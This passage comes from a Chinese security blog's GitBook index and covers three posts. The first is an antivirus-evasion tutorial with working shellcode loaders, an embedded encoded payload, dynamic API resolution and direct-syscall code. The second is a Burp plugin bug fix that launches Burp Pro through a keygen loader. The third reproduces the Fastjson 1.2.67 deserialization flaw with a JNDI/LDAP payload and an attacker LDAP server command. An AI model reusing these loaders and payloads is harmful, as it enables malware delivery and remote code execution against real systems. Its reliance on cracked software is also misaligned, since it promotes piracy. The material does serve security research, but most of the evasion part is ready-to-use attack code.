\"\\x72\\x16\\x74\\x27\\x02\\x57\\x96\\x08\\xe0\\x47\\x22\\x6f\\x72\\xd4\\xb2\" \"\\x10\\x39\\x44\\x14\\x6f\\xc8\\x54\\xcf\\x10\\x39\\x44\\x54\\x6f\\xc8\\x74\" \"\\x87\\x10\\xbd\\xa1\\x3e\\x6d\\x0e\\x37\\x1e\\x10\\x83\\xd6\\xd8\\x1b\\x22\" \"\\x7a\\xd5\\x74\\x92\\x57\\xb5\\xee\\x4e\\x47\\xd6\\x99\\x50\\xfb\\x26\\x66\" \"\\x12\\x4e\\x5c\\x0a\\x92\\x9d\\x36\\x1b\\x0b\\x07\\x07\\xd3\\x32\\x9e\\x74\" \"\\x27\\x43\\x4e\\x52\\x98\\xc6\\x71\\x3c\\x26\\x93\\x56\\x5c\\x10\\xaa\\x52\" \"\\xff\\x67\\x63\\x4f\\xd6\\x88\\x51\\x40\\x3c\\xd8\\x8a\\x47\\x5c\\x6c\\x3a\" \"\\x5e\\x75\\xf1\\x0e\\x37\\x1e\\x10\\x83\\xd6\\xd8\\x66\\x82\\xcf\\xda\\x19\" \"\\xb3\\xd7\\x4c\\xc7\\x36\\xf7\\x9b\\x5b\\xfe\\x32\\x7c\\x62\\x7a\\xd7\\xa2\" \"\\x80\\xea\\x52\\xff\\x67\\x67\\x4f\\xd6\\x88\\xd4\\x57\\xff\\x2b\\x0b\\x42\" \"\\x5c\\x18\\xae\\x5f\\x75\\xf7\\x02\\x8d\\xd3\\xd0\\xfa\\x17\\xa4\\x66\\x1b\" \"\\x47\\x8f\\x06\\xeb\\x4c\\x35\\x7f\\x02\\x5f\\x96\\x02\\xfa\\x95\\x98\\x07\" \"\\x02\\x54\\x28\\xb8\\xea\\x57\\x2d\\x7d\\x0b\\x8d\\xc5\\xb1\\xe5\\xe9\\x8b\" \"\\xd8\\x1e\\x4e\\x6d\\x59\\xb2\\x16\\x74\\x27\\x43\\x06\\xd7\\x10\\x3f\\x9b\" \"\\x75\\x26\\x43\\x06\\x96\\xe2\\x83\\x9d\\x1b\\xa0\\xbc\\xd3\\x6c\\xa8\\x07\" \"\\xb4\\x22\\x66\\xf9\\xa0\\x42\\xe5\\x2f\\xe9\\xa1\\x6f\\xc0\\xc2\\xff\\x64\" \"\\xb4\\x6a\\x7e\\xa7\\xb8\\xe6\\xa2\\x5d\\x09\\x51\\x67\\x55\\x2c\\x6c\\xd7\" \"\\x01\\xf3\\x9f\\xae\\xd8\\x96\\x65\\xb6\\x34\\xd1\\x16\"; // 获取shellcode大小 shellcode_size = sizeof(buf); /* VirtualAlloc( NULL, // 基址 800, // 大小 MEM_COMMIT, // 内存页状态 PAGE_EXECUTE_READWRITE // 可读可写可执行 ); */ char* shellcode = (char*)VirtualAlloc( NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE ); // 将shellcode复制到可执行的内存页中 CopyMemory(shellcode, buf, shellcode_size); hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &dwThreadId // 线程ID ); WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束 return 0; } 可以看到，shellcode加载器的必经流程： VirtualAlloc //创建一块内存空间并标记为可读写执行 MemeryCopy //向创建的内存空间中写入自己的shellcode CreateThread //将程序执行的流程指向这块内存空间 申请内存模块替换 char* shellcode = (char*)VirtualAlloc( NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE ); //将VirtualAlloc替换成HeapCreate/HeapAlloc HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(Shellcode), sizeof(Shellcode)); char * BUFFER = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, sizeof(Shellcode)); memcpy(BUFFER, Shellcode, sizeof(Shellcode)); (*(void(*)())BUFFER)();//多了个指针 等价替换的内存写入的模块 CopyMemory(shellcode, buf, shellcode_size); memcpy(shellcode, buf, shellcode_size); WriteProcessMemory 等价替换跳转内存入口的触发模块 ((void(*)())shellcode)(); hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &dwThreadId // 线程ID ); WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束 //第一种方法 void RunShellCode_1() { PVOID p = NULL; if ((p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) MessageBoxA(NULL, \"申请内存失败\", \"提醒\", MB_OK); if (!(memcpy(p, shellcode, sizeof(shellcode)))) MessageBoxA(NULL, \"写内存失败\", \"提醒\", MB_OK); CODE code =(CODE)p; code(); } //第二种方法 void RunShellCode_2() { ((void(*)(void))&shellcode)(); } //第三种方法 void RunShellCode_3() { __asm { lea eax, shellcode; jmp eax; } } //第四种方法 void RunShellCode_4() { __asm { mov eax, offset shellcode; jmp eax; } } //第五种方法 void RunShellCode_5() { __asm { mov eax, offset shellcode; _emit 0xFF; _emit 0xE0; } } 中级-利用动态调用获取函数 动态获取函数基址 我们可以简单了理解为：函数可以被封装在exe、dll里，而dll中的函数可以理解为像.h的头文件一样供人调用。我们使用的敏感函数也不例外，VirtualAlloc被放在kernel32.dll里面。那么我们直接去找dll要函数地址不就可以往更底层方向去调用函数从而绕过杀软了嘛。 利用GetModuleHandle(等价于LoadLibrary)和GetProcAddress获取指定Dll中的函数基址，利用指针指向函数地址来直接调用。可以理解为重命名了函数名达到免杀目的。(再配合一些小trick如字符串分离就更好了) 原理： GetModuleHandle(等价于LoadLibrary)和GetProcAddress，前者用于获得DLL的句柄，后者用于获得DLL中例程的地址，这种方式之所以被称为动态的，是因为它不需要在程序的开始处把要引入的例程全部列出，只要在调用前引入，并且LoadLibrary可以指定不同的DLL，GetProcAddress可以指定不同的例程，最重要的是如果指定的DLL出错，最多是API调用失败，但不会导致程序终止，因此我们应该在程序中监视DLL的返回值，根据返回值作出相应的处理。 //头文件定义 typedef LPVOID(WINAPI* ImportVirtualAlloc)( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect ); //入口函数下动态获取 ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(\"kernel32.dll\")), \"VirtualAlloc\"); /*使用字符串分割的技巧可以进一步减少静态字符串特征 wchar_t kernel32_str[] = { 'k','e','r','n','e','l','3','2',0 }; char virtualalloc_str[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0 }; ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(kernel32_str), virtualalloc_str); */ char* shellcode = (char*)MyVirtualAlloc( NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE//也可以先申请只读，再利用 ); 高级-系统调用免杀 还记得之前学过的kernel32.dll里的VirtualAlloc函数吗？其实这个只是在用户态的函数，本体是ntdll中被封装起来的NtVirtualAlloc(只不过这里我们用另一个更少见的NtAllocateVirtualMemory函数)。ntdll是系统态的动态链接库，一切系统函数的根源都源自于它内部的基本函数的组合、改造、封装。这里我们就需要写个函数使用syscall去调用。 思路：重新实现一个函数替代GetProcAddress用来对动态链接库抓取函数基址，再写一个函数跳入系统调用去调取ntdll。（再配合小trick分段覆盖shellcode、异或还原等效果更佳） 推荐阅读一下相关文章了解原理： https://blog.csdn.net/tian5753/article/details/80887470 应用程序的代码运行在最低运行级别上ring3上，不能做受控操作。如果要做，比如要访问磁盘，写文件，那就要通过执行系统调用（函数），执行系统调用的时候，CPU的运行级别会发生从ring3到ring0的切换，并跳转到系统调用对应的内核代码位置执行，这样内核就为你完成了设备访问，完成之后再从ring0返回ring3。这个过程也称作用户态和内核态的切换。 （杀软的HOOK监测程序调用API是运行在ring3上的，所以对ring0的系统调用不起作用） 以下是其他一些和代码更贴近的文章： https://paper.seebug.org/1413/#_2 https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/ https://br-sn.github.io/Implementing-Syscalls-In-The-CobaltStrike-Artifact-Kit/ 实现代码+小trick #include #pragma comment(linker,\"/subsystem:windows /entry:mainCRTStartup\") //#pragma comment(linker,\"/subsystem:\\\"windows\\\" /entry:\\\"mainCRTStartup\\\"\")//不显示窗口 //#pragma comment(linker,\"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR\")//减小编译体积 typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect); typedef NTSTATUS(NTAPI* pCopyMemory)(PVOID Destination, CONST VOID* Source, SIZE_T Length); typedef size_t(WINAPI* Importstrlen)( const char* string ); ULONG64 rva2ofs(PIMAGE_NT_HEADERS nt, DWORD rva) { PIMAGE_SECTION_HEADER sh; int i; if (rva == 0) return -1; sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader); for (i = nt->FileHeader.NumberOfSections - 1; i >= 0; i--) { if (sh[i].VirtualAddress e_lfanew); dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory; // no exports? exit rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; if (rva == 0) return NULL; ofs = rva2ofs(nt, rva); if (ofs == -1) return NULL; // no exported symbols? exit exp = (PIMAGE_EXPORT_DIRECTORY)(ofs + hModule); cnt = exp->NumberOfNames; if (cnt == 0) return NULL; // read the array containing address of api names ofs = rva2ofs(nt, exp->AddressOfNames); if (ofs == -1) return NULL; sym = (PDWORD)(ofs + hModule); // read the array containing address of api ofs = rva2ofs(nt, exp->AddressOfFunctions); if (ofs == -1) return NULL; adr = (PDWORD)(ofs + hModule); // read the array containing list of ordinals ofs = rva2ofs(nt, exp->AddressOfNameOrdinals); if (ofs == -1) return NULL; ord = (PWORD)(ofs + hModule); // scan symbol array for api string do { str = (PCHAR)(rva2ofs(nt, sym[cnt - 1]) + hModule); // found it? if (strcmp(str, lpProcName) == 0) { // return the address return (LPVOID)(rva2ofs(nt, adr[ord[cnt - 1]]) + hModule); } } while (--cnt); return NULL; } #define NTDLL_PATH \"%SystemRoot%\\\\system32\\\\NTDLL.dll\" LPVOID GetSyscallStub(LPCSTR lpSyscallName) { HANDLE file = NULL, map = NULL; LPBYTE mem = NULL; LPVOID cs = NULL; PIMAGE_DOS_HEADER dos; PIMAGE_NT_HEADERS nt; PIMAGE_DATA_DIRECTORY dir; PIMAGE_RUNTIME_FUNCTION_ENTRY rf; ULONG64 ofs, start = 0, end = 0, addr; SIZE_T len; DWORD i, rva; CHAR path[MAX_PATH]; ExpandEnvironmentStringsA(NTDLL_PATH, path, MAX_PATH); // open file file = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (file == INVALID_HANDLE_VALUE) { goto cleanup; } // create mapping map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL); if (map == NULL) { goto cleanup; } // create view mem = (LPBYTE)MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0); if (mem == NULL) { goto cleanup; } // try resolve address of system call addr = (ULONG64)GetProcAddress2(mem, lpSyscallName); if (addr == 0) { goto cleanup; } dos = (PIMAGE_DOS_HEADER)mem; nt = (PIMAGE_NT_HEADERS)((PBYTE)mem + dos->e_lfanew); dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory; // no exception directory? exit rva = dir[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress; if (rva == 0) { goto cleanup; } ofs = rva2ofs(nt, rva); if (ofs == -1) { goto cleanup; } rf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ofs + mem); // for each runtime function (there might be a better way??) for (i = 0; rf[i].BeginAddress != 0; i++) { // is it our system call? start = rva2ofs(nt, rf[i].BeginAddress) + (ULONG64)mem; if (start == addr) { // save the end and calculate length end = rva2ofs(nt, rf[i].EndAddress) + (ULONG64)mem; len = (SIZE_T)(end - start); // allocate RWX memory cs = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (cs != NULL) { // copy system call code stub to memory CopyMemory(cs, (const void*)start, len); } break; } } cleanup: if (mem != NULL) UnmapViewOfFile(mem); if (map != NULL) CloseHandle(map); if (file != NULL) CloseHandle(file); // return pointer to code stub or NULL return cs; } int main(int argc, TCHAR* argv[]) { //获取函数 char NtAllocateVirtualMemory_str[] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0}; char RtlMoveMemory_str[] = { 'R','t','l','M','o','v','e','M','e','m','o','r','y',0 }; pNtAllocateVirtualMemory fnNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetSyscallStub(\"NtAllocateVirtualMemory\"); pCopyMemory fnCopyMemory = (pCopyMemory)GetSyscallStub(\"RtlMoveMemory\");//CopyMemory是kernel32中对ntdll中RtlMoveMemory的再封装 int shellcode_size = 0; // shellcode长度 /* length: 800 bytes */ unsigned char buf[] = \"\\xf4\\x42\\x89\\xee\\xfa\\xe2\\xc2\\x0a\\x0a\\x0a\\x4b\\x5b\\x4b\\x5a\\x58\\x5b\\x5c\\x42\\x3b\\xd8\\x6f\\x42\\x81\\x58\\x6a\\x42\\x81\\x58\\x12\\x42\\x81\\x58\\x2a\\x42\\x81\\x78\\x5a\\x42\\x05\\xbd\\x40\\x40\\x47\\x3b\\xc3\\x42\\x3b\\xca\\xa6\\x36\\x6b\\x76\\x08\\x26\\x2a\\x4b\\xcb\\xc3\\x07\\x4b\\x0b\\xcb\\xe8\\xe7\\x58\\x4b\\x5b\\x42\\x81\\x58\\x2a\\x81\\x48\\x36\\x42\\x0b\\xda\\x6c\\x8b\\x72\\x12\\x01\\x08\\x7f\\x78\\x81\\x8a\\x82\\x0a\\x0a\\x0a\\x42\\x8f\\xca\\x7e\\x6d\\x42\\x0b\\xda\\x5a\\x81\\x42\\x12\\x4e\\x81\\x4a\\x2a\\x43\\x0b\\xda\\xe9\\x5c\\x42\\xf5\\xc3\\x4b\\x81\\x3e\\x82\\x42\\x0b\\xdc\\x47\\x3b\\xc3\\x42\\x3b\\xca\\xa6\\x4b\\xcb\\xc3\\x07\\x4b\\x0b\\xcb\\x32\\xea\\x7f\\xfb\\x46\\x09\\x46\\x2e\\x02\\x4f\\x33\\xdb\\x7f\\xd2\\x52\\x4e\\x81\\x4a\\x2e\\x43\\x0b\\xda\\x6c\\x4b\\x81\\x06\\x42\\x4e\\x81\\x4a\\x16\\x43\\x0b\\xda\\x4b\\x81\\x0e\\x82\\x42\\x0b\\xda\\x4b\\x52\\x4b\\x52\\x54\\x53\\x50\\x4b\\x52\\x4b\\x53\\x4b\\x50\\x42\\x89\\xe6\\x2a\\x4b\\x58\\xf5\\xea\\x52\\x4b\\x53\\x50\\x42\\x81\\x18\\xe3\\x45\\xf5\\xf5\\xf5\\x57\\x60\\x0a\\x43\\xb4\\x7d\\x63\\x64\\x63\\x64\\x6f\\x7e\\x0a\\x4b\\x5c\\x43\\x83\\xec\\x46\\x83\\xfb\\x4b\\xb0\\x46\\x7d\\x2c\\x0d\\xf5\\xdf\\x42\\x3b\\xc3\\x42\\x3b\\xd8\\x47\\x3b\\xca\\x47\\x3b\\xc3\\x4b\\x5a\\x4b\\x5a\\x4b\\xb0\\x30\\x5c\\x73\\xad\\xf5\\xdf\\xe3\\x99\\x0a\\x0a\\x0a\\x50\\x42\\x83\\xcb\\x4b\\xb2\\xb1\\x0b\\x0a\\x0a\\x47\\x3b\\xc3\\x4b\\x5b\\x4b\\x5b\\x60\\x09\\x4b\\x5b\\x4b\\xb0\\x5d\\x83\\x95\\xcc\\xf5\\xdf\\xe1\\x73\\x51\\x42\\x83\\xcb\\x42\\x3b\\xd8\\x43\\x83\\xd2\\x47\\x3b\\xc3\\x58\\x62\\x0a\\x38\\xca\\x8e\\x58\\x58\\x4b\\xb0\\xe1\\x5f\\x24\\x31\\xf5\\xdf\\x42\\x83\\xcc\\x42\\x89\\xc9\\x5a\\x60\\x00\\x55\\x42\\x83\\xfb\\xb0\\x15\\x0a\\x0a\\x0a\\x60\\x0a\\x62\\x8a\\x39\\x0a\\x0a\\x43\\x83\\xea\\x4b\\xb3\\x0e\\x0a\\x0a\\x0a\\x4b\\xb0\\x7f\\x4c\\x94\\x8c\\xf5\\xdf\\x42\\x83\\xfb\\x42\\x83\\xd0\\x43\\xcd\\xca\\xf5\\xf5\\xf5\\xf5\\x47\\x3b\\xc3\\x58\\x58\\x4b\\xb0\\x27\\x0c\\x12\\x71\\xf5\\xdf\\x8f\\xca\\x05\\x8f\\x97\\x0b\\x0a\\x0a\\x42\\xf5\\xc5\\x05\\x8e\\x86\\x0b\\x0a\\x0a\\xe1\\xb9\\xe3\\xee\\x0b\\x0a\\x0a\\xe2\\x88\\xf5\\xf5\\xf5\\x25\\x47\\x63\\x69\\x78\\x65\\x79\\x65\\x6c\\x7e\\x4e\\x65\\x69\\x79\\x25\\x6b\\x70\\x7f\\x78\\x6f\\x27\\x6e\\x65\\x69\\x79\\x27\\x7a\\x78\\x25\\x68\\x66\\x65\\x68\\x0a\\x3f\\x45\\x2b\\x5a\\x2f\\x4a\\x4b\\x5a\\x51\\x3e\\x56\\x5a\\x50\\x52\\x3f\\x3e\\x22\\x5a\\x54\\x23\\x3d\\x49\\x49\\x23\\x3d\\x77\\x2e\\x4f\\x43\\x49\\x4b\\x58\\x27\\x59\\x5e\\x4b\\x44\\x4e\\x4b\\x58\\x4e\\x27\\x4b\\x44\\x5e\\x0a\\x49\\x65\\x64\\x64\\x6f\\x69\\x7e\\x63\\x65\\x64\\x30\\x2a\\x41\\x6f\\x6f\\x7a\\x27\\x4b\\x66\\x63\\x7c\\x6f\\x07\\x00\\x49\\x65\\x64\\x7e\\x6f\\x64\\x7e\\x27\\x5e\\x73\\x7a\\x6f\\x30\\x2a\\x2a\\x7e\\x6f\\x72\\x7e\\x25\\x62\\x7e\\x67\\x66\\x26\\x6b\\x7a\\x7a\\x66\\x63\\x69\\x6b\\x7e\\x63\\x65\\x64\\x25\\x72\\x62\\x7e\\x67\\x66\\x21\\x72\\x67\\x66\\x26\\x6b\\x7a\\x7a\\x66\\x63\\x69\\x6b\\x7e\\x63\\x65\\x64\\x25\\x72\\x67\\x66\\x07\\x00\\x5f\\x79\\x6f\\x78\\x27\\x4b\\x6d\\x6f\\x64\\x7e\\x30\\x2a\\x47\\x43\\x49\\x58\\x45\\x59\\x45\\x4c\\x5e\\x55\\x4e\\x4f\\x5c\\x43\\x49\\x4f\\x55\\x47\\x4f\\x5e\\x4b\\x4e\\x4b\\x5e\\x4b\\x55\\x58\\x4f\\x5e\\x58\\x43\\x4f\\x5c\\x4b\\x46\\x55\\x49\\x46\\x43\\x4f\\x44\\x5e\\x07\\x00\\x59\\x45\\x4b\\x5a\\x4b\\x69\\x7e\\x63\\x65\\x64\\x30\\x2a\\x28\\x62\\x7e\\x7e\\x7a\\x30\\x25\\x25\\x79\\x69\\x62\\x6f\\x67\\x6b\\x79\\x24\\x67\\x63\\x69\\x78\\x65\\x79\\x65\\x6c\\x7e\\x24\\x69\\x65\\x67\\x25\\x7d\\x63\\x64\\x6e\\x65\\x7d\\x79\\x67\\x6f\\x7e\\x6b\\x6e\\x6b\\x7e\\x6b\\x25\\x79\\x6f\\x78\\x7c\\x63\\x69\\x6f\\x79\\x25\\x38\\x3a\\x3a\\x3e\\x25\\x3a\\x38\\x25\\x3b\\x38\\x25\\x6e\\x67\\x79\\x25\\x4e\\x6f\\x7c\\x63\\x69\\x6f\\x47\\x6f\\x7e\\x6b\\x6e\\x6b\\x7e\\x6b\\x59\\x6f\\x78\\x7c\\x63\\x69\\x6f\\x25\\x4d\\x6f\\x7e\\x4e\\x6f\\x7c\\x63\\x69\\x6f\\x47\\x6f\\x7e\\x6b\\x6e\\x6b\\x7e\\x6b\\x28\\x07\\x00\\x42\\x65\\x79\\x7e\\x30\\x2a\\x7d\\x7d\\x7d\\x24\\x65\\x65\\x65\\x7a\\x79\\x24\\x7e\\x61\\x07\\x00\\x0a\\x3f\\x45\\x2b\\x5a\\x2f\\x4a\\x4b\\x5a\\x51\\x3e\\x56\\x5a\\x50\\x52\\x0a\\x4b\\xb4\\xfa\\xbf\\xa8\\x5c\\xf5\\xdf\\x42\\x3b\\xc3\\xb0\\x0a\\x0a\\x4a\\x0a\\x4b\\xb2\\x0a\\x1a\\x0a\\x0a\\x4b\\xb3\\x4a\\x0a\\x0a\\x0a\\x4b\\xb0\\x52\\xae\\x59\\xef\\xf5\\xdf\\x42\\x99\\x59\\x59\\x42\\x83\\xed\\x42\\x83\\xfb\\x42\\x83\\xd0\\x4b\\xb2\\x0a\\x2a\\x0a\\x0a\\x43\\x83\\xf3\\x4b\\xb0\\x18\\x9c\\x83\\xe8\\xf5\\xdf\\x42\\x89\\xce\\x2a\\x8f\\xca\\x7e\\xbc\\x6c\\x81\\x0d\\x42\\x0b\\xc9\\x8f\\xca\\x7f\\xdd\\x52\\x52\\x52\\x42\\x0f\\xfd\\x0b\\x0a\\x0a\\x5a\\xc9\\xe2\\x75\\xf7\\xf5\\xf5\\x7d\\x7d\\x7d\\x24\\x65\\x65\\x65\\x7a\\x79\\x24\\x7e\\x61\\x0a\\x0a\\x0a\\x0a\\x0a\"; char first[] = \"\\xfc\";//取第一字节分段复制 for (int i = 0; i Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2021-07-19 14:08:44 "},"markdown/工程化/插件编写/burp插件——记一次修复Bug之旅/burp插件——记一次修复Bug之旅.html":{"url":"markdown/工程化/插件编写/burp插件——记一次修复Bug之旅/burp插件——记一次修复Bug之旅.html","title":"Burp插件——记一次修复Bug之旅","keywords":"","body":"burp插件——记一次修复Bug之旅 配置调试参数 burp插件的话，由于依赖Burp运行，所以需要调成远程调试模式。配置如下： 设为jdk5-8，输入-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 启动要注意，因为高版本的burp需要用jdk13以上，所以调试会出bug，因此要用低版本burp进行测试。 java -Xbootclasspath/p:burp-loader-keygen-jas502n.jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar burpsuite_pro_v2.0.11beta.jar 修复Bug Passive Scan Client这个插件原本v0.2版本是有Bug的，因为红框处配置了setDoOutput(true);当POST的时候需要配置为true，而GET时必须配置为false；此处配置导致GET包都被当作POST包发送而对扫描器产生错误。 详见参考https://blog.csdn.net/sbc1232123321/article/details/79334130 因此我们需要在这里添加一个逻辑来判断是否需要开关setDoOutput，然后进行设置就好了。 调试环节 在这里进行调试测试，发现post包又不行了。 往下翻可以看到在原逻辑上直接加判断，在判断内进行设置setDoOutput开关会导致报错。原因是httpsConn.setRequestProperty是在原逻辑判断的语句下面才执行的；而这个方法的正确调用方式是，必须先执行httpsConn.setRequestProperty后才能设置setDoOutput。 因此，我们在设置属性时先进行一个flag的设置，在设置属性结束后，也就是httpsConn.setRequestProperty执行完后，再加一个判断来设置就好了。 再次打断点调试 可以看到，已经解决了。 再起波澜 有一天，我看到一个开发者提了个pr，才发现我只在HttpsProxy方法里做的判断修复bug，而HttpProxy没有。chen1sheng提到的情况反了，但不影响我真的粗心大意。继续在HttpProxy方法对应的地方修复代码，加入的逻辑同上。 另外在chen1sheng提交的另一个pr里，解决了另一个bug。也就是设置属性时的异常截断问题。 在代码里加一个空格就解决了。 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2022-02-25 03:54:14 "},"markdown/漏洞研究/JAVA安全/Fastjson/fastjson_1267反序列化复现.html":{"url":"markdown/漏洞研究/JAVA安全/Fastjson/fastjson_1267反序列化复现.html","title":"Fastjson 1267反序列化复现","keywords":"","body":"fastjson_1267反序列化复现 是什么？ 什么是序列化和反序列化？ 序列化字符串 -> 对象 -> 实例 {狗子:3} -> 狗子.jpg X 3 -> 什么是Fastjson反序列化漏洞？ WEB服务器：fastjson老弟，我雇你替我把{狗子:3}转换成 fastjson： 好嘞， 让我看清楚上面写了啥。{狗子:3,hakcer:\"rmi://safedoge.com/d3ge\"}，不是黑名单里的藏獒和二哈，是柴犬doge！ 针不戳，我也喜欢柴犬。 让我再看看咱们的本地仓库里有这样狗子吗？ 有dog库，但好像没有斜眼笑的柴犬，不过dog库上记载了一种lookup方法可以允许我们根据字符串上的远程服务器寻找我们需要的对象，那得按照字符串上面写的远程服务器上safedoge.com/d3ge找找了。 safedoge远程服务器：这是你要的 fastjson：转交给web服务器吧。 web服务器：？？？我要的是正经狗子，不要这种眼歪嘴斜的。 那么假如我们指向hacker远程服务器，上面的doge改成rm -rf *,那岂不是... 什么是远程XXXXXXXX？ 你看吗？我不看的 RMI（和LDAP差不多） Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。 Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。 JRMP Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议（英语：Wire protocol）。 JDNI Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。 为什么？ (太干了，容易消化不良，建议回家自己配奶茶慢慢吃) 调用栈分析 这里说明一下，对于fastjson漏洞而言，主流的利用方法都是通过JDNI->RMI/LDAP的形式，这些词语具体是什么意思前面有提到。 1.2.47以前可以通过java原生库进行攻击，1.2.48以后由于越来越严格的黑名单导致大多需要WEB应用导入的其他库才能进行攻击。 因而我们的利用都是建立在相同的手法上：fastjson的pasereObject（脑图有提到执行的详细调用关系）->invoke->lookup（可控的参数）->指向RMI/LDAP恶意远程服务->exec(whoami) 所以1.2.48以后不同版本间利用漏洞的区别很小，主要在于寻找其他未被加入黑名单的库依赖中，是否存在的可控参数的lookup()函数，实际在调用栈中的形式大同小异。参考如下图 有兴趣学习更深的同学建议亲自动手调试！！！建议亲自动手调试！！！并建议亲自动手调试！！！ 推荐阅读 结合这篇文章食用效果更佳： https://paper.seebug.org/994/#11-defaultjsonparser 怎么样（做）？ 配环境永远是最大的敌人 安装JDK1.80_102 RMI/LDAP；一定要先下载对JDK！！！！防止中途返工被气死（老版本已经找不到了，我找了非常久才下到一个，需要的同学私信我发给你） 下载IDEA（收费的，有能力支持支持正版哈） 这个我用了很麻烦，有坑 https://justcode.ikeepstudying.com/2020/07/intellij-idea-2020-2-%E7%A0%B4%E8%A7%A3%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%B2%E6%B5%8B%E6%9C%89%E6%95%88%EF%BC%8C%E5%8F%AF%E6%BF%80%E6%B4%BB%E8%87%B3-2089-%E5%B9%B4%EF%BC%8C%E6%8C%81/ 我自己用的这个 https://tech.souyunku.com/?p=15076 IDEA自动的maven 3.3有坑。下载新版maven3.6！！！！ https://maven.apache.org/ 配置pom 把我们需要的依赖导入，主要是fastjson1.2.67和shiro-core 4.0.0 groupId fastjson_1.2.67_poc 1.0-SNAPSHOT com.alibaba fastjson 1.2.67 org.apache.shiro shiro-core 1.5.1 org.slf4j slf4j-simple 1.7.25 test org.slf4j slf4j-nop 1.7.25 UTF-8 UTF-8 1.8 1.8 1.8 点击同步 同步失败！！！可以把依赖删了同步一次，再加上再同步一次试试。 防止稀奇古怪的问题折磨你半个星期，C盘被撑爆，甚至正常过了一段时间一些莫名其妙又重新出现的同步失败等等 还是同步不了的同学试试挂代理 如果还是不能试试在settings.xml中添加镜像 alimaven aliyun maven http://maven.aliyun.com/nexus/content/groups/public/ central 如果还是不行，建议换台电脑或者直接放弃。用虚拟机+docker吧。 开始复现（好像是最简单的） 我们来复习一下攻击流程 IDEA工程中添加一个新的java文件，定义一个json字符串payload，用fastjson解析它。 import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; import org.apache.shiro.*; public class test { public static void main(String[] args) { System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \"{\\\"@type\\\":\\\"org.apache.shiro.jndi.JndiObjectFactory\\\",\\\"resourceName\\\":\\\"ldap://yourserver:8888/Object\\\"}\"; //String payload = \"{\\\"zeo\\\":{\\\"@type\\\":\\\"java.net.Inet4Address\\\",\\\"val\\\":\\\"rny3ko.dnslog.cn\\\"}}\"; try { JSON.parseObject(payload); } catch (Exception e) { e.printStackTrace(); } } } 在VPS上启动我们的LDAP服务 这里推荐使用国内师傅写的RMI/LDAP一键启动工具：https://github.com/wyzxxz/fastjson_rce_tool java -cp fastjson_tool.jar fastjson.HLDAPServer 256.256.256.256 8888 \"calc\" idea点击运行，嗯？怎么感觉一点反应都没有。（记得给VPS加上出入站规则哦） 好了，这总算是可以了吧 运行一下程序，攻击成功 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-24 17:56:54 